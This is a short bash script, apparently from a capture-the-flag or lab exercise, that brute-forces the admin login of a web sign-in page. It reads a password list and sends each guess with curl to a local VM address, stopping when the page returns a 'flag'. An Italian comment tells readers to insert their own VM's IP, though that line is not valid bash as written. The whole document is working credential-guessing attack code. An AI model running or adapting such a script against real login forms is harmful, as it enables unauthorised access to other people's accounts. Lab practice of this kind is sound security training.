#!/bin/bash

pswdlist=($(cat pswdlist))
length=${#pswdlist[@]}
current=0
ip_address="192.168.0.150"  <-- QUI VA IP_ADRRESS Della vostra VM

for pswd in "${pswdlist[@]}"
do
    response=$(curl -s "http://$ip_address/?page=signin&username=admin&password=$pswd&Login=Login" | grep "flag")

    if [ ! -z "$response" ]; then
        echo "FOUND IT ! Password is : $pswd"
        echo $response
        break
    fi

    current=$((current+1))
    echo -ne " progress : $(((current * 100) / length))%\r"

done
